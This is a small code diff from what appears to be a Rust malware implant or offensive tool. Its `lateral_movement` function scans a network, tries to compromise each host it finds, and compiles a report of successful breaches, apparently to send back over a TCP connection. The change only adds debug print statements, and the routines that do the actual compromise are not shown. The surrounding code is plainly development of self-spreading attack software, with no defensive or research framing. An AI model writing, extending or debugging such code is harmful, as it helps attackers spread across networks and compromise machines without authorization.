@@ -514,13 +514,15 @@ async fn get_target_info(target: &str) -> String {
 pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
     let targets = scan_network().await;
     let mut report = String::new();
-
+    println!("Done: {}", targets.len());
     if targets.is_empty() {
         report.push_str("No lateral movement targets found\n");
     } else {
+        println!("Going");
         report.push_str(&format!("Lateral movement targets: {:?}\n", targets));
 
         for target in targets {
+            println!("Target");
             if attempt_lateral_movement(&target).await {
                 report.push_str(&format!(
                     "Lateral movement successful on target: {}\n",
